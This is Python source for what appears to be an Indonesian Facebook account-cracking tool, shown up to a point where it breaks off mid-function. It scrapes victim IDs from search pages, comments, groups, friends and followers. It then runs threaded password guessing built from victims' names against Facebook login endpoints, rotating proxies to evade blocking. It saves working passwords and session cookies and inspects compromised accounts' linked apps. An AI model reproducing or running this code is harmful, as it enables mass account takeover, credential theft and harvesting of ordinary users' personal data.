 ###---[ DUMP NO LOGIN ]---### 
 def crack_nomor(): 
         print(f' [{hh}<{P}] correct content') 
         depan = input(' awalan : ') 
         if len(depan)==3:pass 
         else:exit(f' [{M}>{P}] Example prefix number 089') 
         jumla = input(' amount : ') 
         for x in range(int(amount)): 
                 rr = random.randint 
                 A = depan 
                 B = rr(1111,9999) 
                 C = rr(1,9) 
                 D = f'{A}{C}-{str(rr(1111,9999))}-{str(B)}' 
                 if D in dump:pass 
                 else:dump.append(D+'|123456') 
                 print('\r being dumped %s id'%(len(dump)),end=" ") 
                 sys.stdout.flush() 
                 sleep(0.0000003) 
         atur_atur() 
                  
  
 def clon_email(): 
         rc = random.choice 
         rr = random.randint 
         bas = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko'] 
         blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep'] 
         global ok , cp 
         print(f' [{hh}>{P}] dumps of email, max 1000 id') 
         nama = input(' target : ') 
         if ',' in str(nama): 
                 exit(f' [{M}<{P}] Enter only 1 name') 
         doma = input(' domain : ') 
         if '@' not in str(doma) or '.com' not in str(doma): 
                 exit(f' [{M}<{P}] enter the correct domain') 
         jumlah = input(' total  : ') 
         for xyz in range(int(jumlah)): 
                 A = nama 
                 B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}'] 
                 C = doma 
                 D = f'{A}{str(rc(B))}{C}' 
                 if D in dump:pass 
                 else:dump.append(D+'|'+nama) 
                 if len(dump)==2000:atur_atur() 
                 print('\r being dumped %s id'%(len(dump)),end='') 
                 sys.stdout.flush() 
         atur_atur()         
  
 def crack_file(): 
         file = input(f' [{hh}<{P}] Enter the name of the dump file\n file : ') 
         try: 
                 uuid = open(file,'r').readlines() 
                 for data in uuid: 
                         try:user,nama = data.split('|') 
                         except:exit(f" [{M}>{P}] wrong separator") 
                         dump.append(data) 
                         print('\r being dumped %s id'%(len(dump)),end=" ") 
                         sleep(0.0000003) 
         except FileNotFoundError:exit(f" [{M}>{P}] file tidak ada") 
         print(f'\r [{hh}<{P}] the total number of accounts is {len(dump)}') 
         atur_atur() 
          
 def crack_search(): 
         Name = [] 
         custom = [" muhammad"," firman"," pratama"," tyz"," galau"," semarang"," boyolali"," cilacap"," kebumen"," banyumas"," herex"," tuban"," sumedang"," aja"," new"," baru"," setia"," sayang"," cinta"," syank kamu"," cantik"," ganteng"," imut"," kalem"," sragen"," susah sembuh"," sudah sembuh"," sakit"," wae"," sulung"," nur"," dwi"," x gans"," x jebe"," x cogan"," x id"," ganong"," situbondo"," aremania"," sunda"," garut"," cirebon"," sukabumi"," medan"," thejack"," bobotoh"," bonek"," suroboyo"," surabaya"," persebaya"," persib"," persija"," cilacap"," jepara"," solo"," official"," manis"," imut"," kalem"," utama"," sukses"," real"," semok"," kesepian"," rentcar"," makmur"," jaya"," jr"," tasik"," malang"," jogja"," mama"," ibuknya"," bundanya"," tiktok"," kece"," keren"," baru"," jutek"," saja"," putri"," andi"," dewi"," tri"," dian"," sri"," putri"," eka"," sari"," aditya"," basuki"," budi"," joni"," toni"," bekti"," cahya"," harahap"," riski"," farhan"," aden"," joko"," firman"," sulis"," soleh"," gagal"," kacau"," sulis"," rahmat"," indah"," pribadi"," saputro"," saputra"," kediri"," kudus"," jember"," situbondo"," pemalang"," wonosobo"," trenggalek","  tuban"," gresik"," bangkalan"," jombang"," kediri"," lamongan"," lumajang"," madiun"," magetan"," mojokerto"," nganjuk"," pacitan"," ngawi"," pasuruan"," ponorogo"," pamengkasan"," sidoarjo"," tuban"," blitar"," kediri"," banjarnegara"," batang"," blora"," brebes"," grobokan"," karanganyar"," kendal"," klaten"," kudus"," pati"," pekalongan"," rembang"," sragen"," tegal"," temanggung"," wonogiri"," wonosobo"," sukoharjo"," salatiga"," bandung"," ciamis"," cianjur"," cirebon"," indramayu"," majalengka"," subang"," sumedang"," purwakarta"," banjar"," bekasi"," bogor"," comahi"," depok"," tasikmalaya "] 
         custom2 = ["mamah ","ibuk ","bunda ","ayah ","om ","muhammad ","putra ","gagah ","namaku ","panggeran ","putri ","dewi ","joko ","sri ","dwi ","cinta ","sayang ","riski ","pesulap ","mamanya ","tante ","bu ","pakde ","juli ","emak "] 
         print(f' [{hh}<{P}] 1 nama setara dengan 10k akun') 
         nam = input(f' nama : ').split(",") 
         for ser in nam:                 
                 for belakang in custom: 
                         id = ser+belakang 
                         nama.append(id) 
                 for depan in custom2: 
                         id = depan+ser 
                         nama.append(id) 
         with tred(max_workers=35) as thread: 
                 for id in nama: 
                         thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID") 
         atur_atur() 
                  
 def cari_nama(link): 
         r = parser(ses.get(str(link)).text,'html.parser') 
         for x in r.find_all('td'): 
                 data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x)) 
                 for uid,nama in data: 
                         if 'profile.php?' in uid: 
                                 uid = re.findall('id=(.*)',str(uid))[0] 
                         elif '<span' in nama: 
                                 nama = re.findall('(.*?)\<',str(nama))[0] 
                         bo = uid+'|'+nama 
                         if bo in dump:pass 
                         else:dump.append(bo) 
         try: 
                 link = r.find('a',string=' R4FSAN💔 Selanjutnya').get('href') 
                 if(link): 
                         print('\r being dumped %s id'%(len(dump)),end=" ") 
                         sys.stdout.flush() 
                         cari_nama(link) 
         except:pass 
          
  
 def crack_komen(): 
         ide = input(f' [{hh}<{P}] Enter the target post id\n id post : ') 
         url = 'https://mbasic.facebook.com/'+ide 
         try:get_komen(url) 
         except KeyboardInterrupt:atur_atur() 
         if len(dump)==0: 
                 exit(f' [{M}>{P}] Failed to dump comments') 
         atur_atur() 
  
 def get_komen(url): 
         data = parser(ses.get(url).text,"html.parser") 
         for isi in data.find_all("h3"): 
                 for ids in isi.find_all("a",href=True): 
                         if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","") 
                         else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","") 
                         nama = ids.text 
                         if id+"|"+nama in dump:pass 
                         else:dump.append(id+"|"+nama) 
                         print(f'\r sedang dump {len(dump)} id ',end='');sys.stdout.flush() 
         for z in data.find_all("a",href=True): 
                 if "See previous comments…" in z.text: 
                         try:get_komen("https://mbasic.facebook.com"+z["href"]) 
                         except:pass 
                          
                          
          
 ###---[ DUMP LOGIN ]---### 
 def crack_publik(t,c): 
         akun = input(f' [{hh}<{P}] MAKE SURE THE ACCOUNT IS PUBLIC \n ID : ') 
         try: 
                 bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(id,name,username)&access_token={t}',cookies=c).json() 
                 for pi in bas['friends']['data']: 
                         try: 
                                 try:dump.append(pi['username']+'|'+pi['name']) 
                                 except:dump.append(pi['id']+'|'+pi['name']) 
                                 print('\r sedang dump %s id'%(len(dump)),end=" ") 
                                 sys.stdout.flush() 
                                 time.sleep(0.0002) 
                         except:continue 
                 atur_atur() 
         except (KeyError,IOError): 
                 exit(f" [{M}>{P}] unpublic account")         
  
  
 def crack_masal(t,c): 
     print(f' [{hh}<{P}] MAKE SURE THE ACCOUNT IS PUBLIC ') 
     try: 
         bz=0 
         apa = int(input(f' TOTAL ID : ')) 
     except:apa=1 
     for bz in range(apa): 
             bz +=1 
             akun = input(f'\r ID {bz} : ') 
             try: 
                     bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(name,username,id)&access_token={t}',cookies=c).json() 
                     for pi in bas['friends']['data']: 
                           try:dump.append(pi['username']+'|'+pi['name']) 
                           except:dump.append(pi['id']+'|'+pi['name']) 
                           print('\r being dumped %s id'%(len(dump)),end=" ") 
                           sys.stdout.flush() 
                           time.sleep(0.0002) 
             except: 
                     print(f"\r [{kk}!{P}] unpublic account       ") 
                     continue                                                
     atur_atur() 
      
      
 def crack_foll(t,c): 
         akun = input(f' [{hh}<{P}] make sure the account is public \n account : ') 
         try: 
                 bas = ses.get(f"https://graph.facebook.com/{akun}?fields=name,subscribers.fields(id,username,name).limit(1000000000)&access_token={t}",cookies=c).json() 
                 for pi in bas["subscribers"]["data"]: 
                         try: 
                                 try:dump.append(pi['username']+'|'+pi['name']) 
                                 except:dump.append(pi['id']+'|'+pi['name']) 
                                 print('\r sedang dump %s id'%(len(dump)),end=" ") 
                                 sys.stdout.flush() 
                                 time.sleep(0.0002) 
                         except:continue 
                 atur_atur() 
         except (KeyError,IOError): 
                 exit(f" [{M}>{P}] unpublic account") 
                  
 def crack_group(): 
         link = input(f' [{hh}<{P}] make sure the group is public \n id group : ') 
         url = "https://mbasic.facebook.com/groups/"+link 
         try:dump_grup(url) 
         except KeyboardInterrupt:atur_atur() 
         if len(dump)==0: 
                 exit(f' [{M}>{P}] failed dump group') 
         atur_atur() 
  
 def dump_grup(url): 
         try: 
                 data = parser(ses.get(url, headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1; A1601 Build LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/E7FBAF"}).text, "html.parser") 
                 for x in data.find_all("table"): 
                         par = x.text 
                         if ">" in par.split(" ") or "submit" in par.split(" "): 
                                 id = re.findall("content_owner_id_new.\w+",str(x))[0].replace("content_owner_id_new.","") 
                                 if " asking question ." in par:nama = par.replace(" asking question .","") 
                                 else:nama = par.split(" > ")[0] 
                                 if id+"|"+nama in dump:pass 
                                 else:dump.append(id+"|"+nama) 
                                 print(f'\r being dumped {len(dump)} id ',end='');sys.stdout.flush() 
                 for z in data.find_all("a"): 
                         if "See More Posts</span" in str(z).split(">"): 
                                 href = str(z).replace('<a href="','').replace("amp;","").split(" ")[0].replace('"><span>Lihat','') 
                                 dump_grup("https://mbasic.facebook.com"+href) 
         except:dump_grup(url) 
                  
                  
 ###---[ ATUR SEBELUM CRACK ]---### 
 akunok = [] 
 def atur_atur(): 
         print(f"\r{P} ===================================================") 
         ro = input(f' [{hh}1{P}] MOBILE [{hh}2{P}] MBASIC : ') 
         if ro in ['1','01']:metode.append('mobile') 
         elif ro in ['2','02']:metode.append('mbasic') 
         else:metode.append('mobile') 
         print(f"{P} ===================================================") 
         ch = input(f' [{hh}RANDOM{P}] O / N / R: ') 
         if ch in ['o','O']: 
                 for x in dump: 
                         id.append(x) 
         elif ch in ['n','N']: 
                 for x in dump: 
                         id.insert(0,x) 
         elif ch in ['r','R']: 
                 for x in dump: 
                         xx = random.randint(0,len(id)) 
                         id.insert(xx,x) 
         else: 
                 for x in dump: 
                         id.append(x) 
         print(f"{P} ===================================================") 
         cp = input(f' [{hh}!{P}] VIEW OPTION CHECKPOINT : NO ') 
         if cp in ['y','Y','ya','Ya','1','01','yy','YA','yA']: 
                 cepeh.append('ya') 
         print(f"{P} ===================================================") 
         apk = input(f' [{hh}!{P}] VIEW APPLICATION : NO ') 
         if apk in ['y','Ya','ya','1']:akunok.append('apk') 
         else:akunok.append('coki') 
         print(f"{P}===================================================") 
         ch = input(f' [{hh}1{P}] MANUAL [{hh}2{P}] COMBINE [{hh}3{P}] DEFAULT : ') 
         if ch in ['1','01']:manual() 
         elif ch in ['2','2']:gabung() 
         elif ch in ['3','03']:otomatis() 
         else:otomatis() 
          
 from datetime import datetime             
 ###---[ ATUR SANDI ]---### 
 def manual(): 
         global ok,cp 
         pwx = [] 
         print(f"{P} ===================================================") 
         B = input(f' [{hh}>{P}] manual password input 6 words\n password  : ').split(',') 
         for x in B: 
                 pwx.append(x) 
         print(f"{P} ===================================================") 
         print(f' account ok at : {sim_ok}\n cp account at : {sim_cp}') 
         print(f"{P} ===================================================") 
         awal = datetime.now() 
         with tred(max_workers=30) as babas: 
                 for akun in id: 
                         idf,nama = akun.split('|')[0],akun.split('|')[1].lower() 
                         if 'mobile' in metode: 
                                 babas.submit(crack,idf,pwx,"m.facebook.com",beginning) 
                         elif 'mbasic' in metode: 
                                 babas.submit(crack,idf,pwx,"mbasic.facebook.com",beginning) 
                         elif 'free' in metode: 
                                 babas.submit(crack,idf,pwx,"free.facebook.com",beginning) 
                         else: 
                                 babas.submit(crack,idf,pwx,"m.facebook.com",beginning) 
         sleep(5) 
         exit(f'\r [{hh}<{P}] crack has been completed number of OK:{ok} amount of CP:{cp} ') 
  
  
 def gabung(): 
         global ok,cp 
         pwx = [] 
         A = ["123456"] 
         print(f"{P} ===================================================") 
         B = input(f' [{hh}>{P}] 6 word manual password input\n password  : ').split(',') 
         C = input(f' [{hh}>{P}] 6 word manual password input\n password  : ') 
         if ',' in str(C): 
                 exit(f" [{M}>{P}] one-word back password only") 
         print(f"{P} ===================================================") 
         print(f' account ok in : {sim_ok}\n account cp in : {sim_cp}') 
         print(f"{P} ===================================================") 
         awal = datetime.now() 
         with tred(max_workers=30) as babas: 
                 for akun in id: 
                         idf,nama = akun.split('|')[0],akun.split('|')[1].lower() 
                         depan = nama.split(" ")[0] 
                         pwx = A+B 
                         if len(nama)<=5: 
                                 if len(depan)<=1 or len(depan)<=2: 
                                         pass  
                                 else: 
                                         pwx.append(depan+"123") 
                                         pwx.append(depan+"12345") 
                                         pwx.append(depan+C) 
                         else: 
                                 if len(depan)<=1 or len(depan)<=2: 
                                         try: 
                                                 tengah = nama.split(" ")[1] 
                                                 if len(tengah)<=3: 
                                                         pass 
                                                 else: 
                                                         pwx.append(tengah+"123") 
                                                         pwx.append(tengah+"12345") 
                                                         pwx.append(tengah+C) 
                                                         pwx.append(nama) 
                                         except: 
                                                 pwx.append(nama) 
                                 else: 
                                         pwx.append(nama) 
                                         pwx.append(depan+"123") 
                                         pwx.append(depan+"12345") 
                                         pwx.append(depan+C) 
                         if 'mobile' in metode: 
                                 babas.submit(crack,idf,pwx,"m.facebook.com",beginning) 
                         elif 'mbasic' in metode: 
                                 babas.submit(crack,idf,pwx,"mbasic.facebook.com",beginning) 
                         elif 'free' in metode: 
                                 babas.submit(crack,idf,pwx,"free.facebook.com",beginning) 
                         else: 
                                 babas.submit(crack,idf,pwx,"m.facebook.com",beginning) 
         sleep(5) 
         exit(f'\r [{hh}<{P}] crack has been completed number of OK:{ok} amount of CP:{cp} ') 
                                  
  
 def otomatis(): 
         global ok,cp 
         print(f"{P} ===================================================") 
         print(f' {H}SAVE OK : {sim_ok}\n {K}SAVE CP : {sim_cp}') 
         print(f"{P} ===================================================") 
         awal = datetime.now() 
         with tred(max_workers=30) as babas: 
                 for akun in id: 
                         idf,nama = akun.split('|')[0],akun.split('|')[1].lower() 
                         depan = nama.split(" ")[0] 
                         pwx = [] 
                         if len(nama)<=5: 
                                 if len(depan)<=1 or len(depan)<=2: 
                                         pass  
                                 else: 
                                         pwx.append(depan+"123") 
                                         pwx.append(depan+"1234") 
                                         pwx.append(depan+"12345") 
                         else: 
                                 if len(depan)<=1 or len(depan)<=2: 
                                         try: 
                                                 tengah = nama.split(" ")[1] 
                                                 if len(tengah)<=3: 
                                                         pass 
                                                 else: 
                                                         pwx.append(tengah+"123") 
                                                         pwx.append(tengah+"1234") 
                                                         pwx.append(tengah+"12345") 
                                                         pwx.append(nama) 
                                         except: 
                                                 try: 
                                                         belakang = nama.split(' ')[2] 
                                                         if len(belakang)<=3:pass 
                                                         else: 
                                                                 pwx.append(belakang+"123") 
                                                                 pwx.append(belakang+"1234") 
                                                                 pwx.append(belakang+"12345") 
                                                                 pwx.append(nama) 
                                                 except:pwx.append(nama) 
                                 else: 
                                         pwx.append(nama) 
                                         pwx.append(depan+"123") 
                                         pwx.append(depan+"1234") 
                                         pwx.append(depan+"12345") 
                         if 'mobile' in metode: 
                                 babas.submit(crack,idf,pwx,"m.facebook.com",awal) 
                         elif 'mbasic' in metode: 
                                 babas.submit(crack,idf,pwx,"mbasic.facebook.com",awal) 
                         elif 'free' in metode: 
                                 babas.submit(crack,idf,pwx,"free.facebook.com",awal) 
                         else: 
                                 babas.submit(crack,idf,pwx,"m.facebook.com",awal) 
         sleep(5) 
         exit(f'\r [{hh}<{P}] crack has been completed number of OK:{ok} amount of CP:{cp} ') 
         #os.popen('play-audio data/finished.mp3') 
                                  
  
 ###---[ MENU CRACK ]---### 
 resok = [] 
 rescp = [] 
 def crack(idf,pwx,url,awal): 
         global loop,ok,cp 
         ses = requests.Session() 
         xx = open('.proxy.txt','r').read().splitlines() 
         ua = random.choice(redmi) 
         proxy = {'http': 'socks5://'+random.choice(xx)} 
         ahir = str(datetime.now()-awal).split('.')[0] 
         print(f"\r [{hh}!{P}] {ahir} %s/%s OK:%s CP:%s"%(loop,len(id),ok,cp),end=" ");sys.stdout.flush() 
         for pw in pwx: 
                 try: 
                         ses.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 8A Pro Build/QKQ1.191014.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate", "accept-language":  "en-US;q=0.8,en;q=0.7"}) 
                         link = ses.get(f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr").text 
                         date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)} 
                         head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login/?app_id=1217981644879628&api_key=1217981644879628&next=https%3A%2F%2Fm.facebook.com%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&skip_api_login=1&no_next_msg&hide_upsell=1&hide_language_selector=0&hide_registration=0&src=fxcal&show_accounts_center_content=1&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"} 
                         bx = ses.post(f"https://{url}/login/device-based/login/async/?api_key=1217981644879628&auth_token=b4c978c6cc29df1e66058283d8bcbabe&skip_api_login=1&next=https%3A%2F%2F{url}%2Ffxauth%2F%3Fapp_id%3D1217981644879628%26etoken%3DAbj6LvpDiwWsf6eJTIX2e02oaKQTl9Bf5mT1GkrnTm5DiILMWyzRpW16pYFZQ00CVAwS2cJzWJ6AVCQ_3EMsW6Z2f3Rj2AJB-Pdqp9EhLCkgZxqDxr9vlkVQ%26extra_data%3D%252Fadd%252F%253Fbackground_page%253D%25252Fconnected_experiences%25252Fcross_posting%25252F%26native_app_login_flow%3Dfbcalcomettest&refsrc=deprecated&app_id=1217981644879628&lwv=100",data=date, headers=head,proxies=proxy) 
                         if "checkpoint" in ses.cookies.get_dict(): 
                                 idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "") 
                                 data = (f'{idf}|{pw}') 
                                 if data in rescp:pass 
                                 else: 
                                         rescp.append(data) 
                                         cp+=1 
                                         if 'ya' in cepeh: 
                                                 cek_opsi(idf,pw,ua) 
                                         else: 
                                                 try: 
                                                         token = open('.token.txt','r').read() 
                                                         bas = {"cookie":open('.cookie.txt','r').read()} 
                                                         ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday'] 
                                                         m, d, y = ttl.split('/') 
                                                         m = tete[m] 
                                                         print(f'\r [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] account  : {kk}{pw}          {P}\n [{kk}>{P}] birthday  : {kk}{d} {m} {y}{P}           \n') 
                                                         sapi = f'{idf}|{pw}|{d} {m} {y}' 
                                                         open('CP/'+sim_cp,'a').write(sapi+'\n') 
                                                         break 
                                                 except: 
                                                         print(f'\n [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] account  : {kk}{pw}          {P}\n') 
                                                         os.popen('play-audio data/cepe.mp3') 
                                                         open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n') 
                                                         break 
                         elif "c_user" in ses.cookies.get_dict(): 
                                 kuki = convert(ses.cookies.get_dict()) 
                                 idf = re.findall('c_user=(.*);xs', kuki)[0] 
                                 data = (f'{idf}|{pw}') 
                                 if data in resok:pass 
                                 else: 
                                         resok.append(data) 
                                         ok+=1 
                                         open('OK/'+sim_ok,'a').write(data+'\n') 
                                         if "coki" in akunok: 
                                                 print("\n %s>> %s|%s %s• %s "%(H,idf,pw,warna_warni_biasa,tahunng(idf))) 
                                                 print("\r %s>> %s "%(H,kuki)) 
                                                 print("\r  %s*--> %s"%(P,ua)) 
                                                 os.popen('play-audio data/woke.mp3') 
                                                 break 
                                         elif "apk" in akunok: 
                                                 cek_apk(idf,pw,kuki) 
                                                 break                                 
                         else: 
                                 continue 
                 except requests.exceptions.ConnectionError: 
                         time.sleep(31) 
                 #except Exception as e:print(e) 
         loop+=1 
          
  
 ###---[ CEK OPSI AKUN CP ]---### 
 opsi = [] 
 def sesi(res): 
         response = parser(res,'html.parser') 
         form = response.find('form',{'method':'post'}) 
         data = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})} 
         r = parser(ses.post('https://mbasic.facebook.com'+form.get('action'),data=data).text, 'html.parser') 
         for i in r.find_all('option'): 
                 opsi.append(i.text) 
         return opsi                 
  
 def cek_opsi(idf,pw,ua): 
         akun = '' 
         try: 
                 token = open('.token.txt','r').read() 
                 bas = {"cookie":open('.cookie.txt','r').read()} 
                 ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday'] 
                 m, d, y = ttl.split('/') 
                 m = tete[m] 
                 akun += f' [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] account  : {kk}{pw}          {P}\n [{kk}>{P}] birthday  : {kk}{d} {m} {y}{P}           ' 
                 mek = f"{idf}|{pw}|{day} {month} {year}" 
                 if 'file' in detek:pass 
                 else:open('CP/'+sim_cp,'a').write(mek+'\n') 
         except: 
                 month = "" 
                 day = "" 
                 year = "" 
                 akun += f' [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] account  : {kk}{pw}          {P}' 
                 if 'file' in detek:pass 
                 else:open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n') 
         try: 
                 h2 = {'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent': ua} 
                 res = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr',headers=h2).text 
                 ress = parser(res, 'html.parser') 
                 form = ress.find('form',{'method':'post'}) 
                 data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})} 
                 data2.update({ 
                                         'email':idf, 
                                         'pass':pw}) 
                 res = ses.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text 
                 ress = parser(res, 'html.parser') 
                 if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text): 
                         akun += f'\n [{hh}>{P}] {hh}hore akun tap yes🎉{P}                       ' 
                 else: 
                         if(len(sesi(res))==0): 
                                 if 'Enter Login Code to Continue' in str(ress.find('title').text): 
                                         akun += f'\n [{kk}>{P}] authentic installed account           ' 
                                 else: 
                                         cok = convert(ses.cookies.get_dict()) 
                                         akun += f'\n [{hh}>{P}] no account checkpoint                       \n [{hh}>{P}] cookie : {cok}' 
                         else: 
                                 akun += f'\n [{kk}>{P}] there is {len(opsi)} opsi :                     ' 
                                 o = 0 
                                 for cp in opsi: 
                                         o+=1 
                                         akun += f'\n [{kk}{o}{P}] {cp}               ' 
                 opsi.clear() 
         except Exception as e: 
                 akun += f'\n [{M}>{P}] wrong password / spam                      ' 
         print('\r'+ akun) 
         print('\r                                                                       ') 
                  
                                  
 ###---[ CONVERT COOKIE ]---### 
 def convert(cookie): 
         cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr'])) 
         return(str(cok)) 
  
  
 ###---[ CEK APLIKASI ]---### 
 #--[ convert bahasa ]--# 
 def language(cookie): 
         try: 
                 url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie) 
                 data = parser(url.text,'html.parser') 
                 for x in data.find_all('form',{'method':'post'}): 
                         if 'Bahasa Indonesia' in str(x): 
                                 bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"} 
                                 eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie) 
         except:pass 
  
 #--[ pusat print ]--# 
 apk1, apk2, apk3 = [], [], [] 
 def cek_apk(idf,pw,kuki): 
         cookie = {"cookie" : kuki} 
         language(cookie) 
         akun = (f' [{hh}>{P}] email  : {hh}{idf}{P}          \n [{hh}>{P}] account  : {hh}{pw}          {P}\n [{hh}>{P}] cookie : {hh}{kuki}{P}') 
         try:                 
                 url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active" 
                 get_active(url,cookie) 
         except Exception as e:pass 
         try:                         
                 url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive" 
                 get_inactive(url,cookie) 
         except Exception as e:pass 
         try:                         
                 url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed" 
                 get_remove(url,cookie) 
         except Exception as e:pass 
         print('\r'+akun) 
         if len(apk1)==0:pass 
         else: 
                 akun = (f' [{hh}>{P}] application added :                     ') 
                 no = 0 
                 for apk in apk1: 
                         no += 1 
                         akun += (f'\n {P}[{hh}{no}{P}] {hh}{apk.lower()}            ') 
                 print('\r'+akun) 
         if len(apk2)==0:pass 
         else: 
                 akun = (f' {P}[{kk}>{P}] expired application :                   ') 
                 no = 0 
                 for apk in apk2: 
                         no += 1 
                         akun += (f'\n {P}[{kk}{no}{P}] {kk}{apk.lower()}             ') 
                 print('\r'+akun) 
         if len(apk3)==0:pass 
         else: 
                 akun = (f' {P}[{M}>{P}] deleted apps :                  ') 
                 no = 0 
                 for apk in apk3: 
                         no += 1 
                         akun += (f'\n {P}[{M}{no}{P}] {M}{apk.lower()}               ') 
                 print('\r'+akun) 
         apk1.clear() 
         apk2.clear() 
         apk3.clear() 
         print("\r                                             ") 
                          
                          
 #--[ cek apk aktif ]--# 
 def get_active(url,cookie): 
         try: 
                 data = parser(ses.get(url,cookies=cookie).content,"html.parser") 
                 for apk in data.find_all('h3'): 
                         if 'Ditambahkan' in apk.text:                                         
                                 apk1.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}") 
                         else:continue 
                 next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href'] 
                 get_active(next,cookie) 
         except:pass 
  
 #--[ cek apk kadaluarsa ]--# 
 def get_inactive(url,cookie): 
         try: 
                 data = parser(ses.get(url,cookies=cookie).content,"html.parser") 
                 for apk in data.find_all('h3'): 
                         if 'expired' in apk.text: 
                                 apk2.append(f"{str(apk.text).replace('expired',' expired')}") 
                         else:continue 
                 next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href'] 
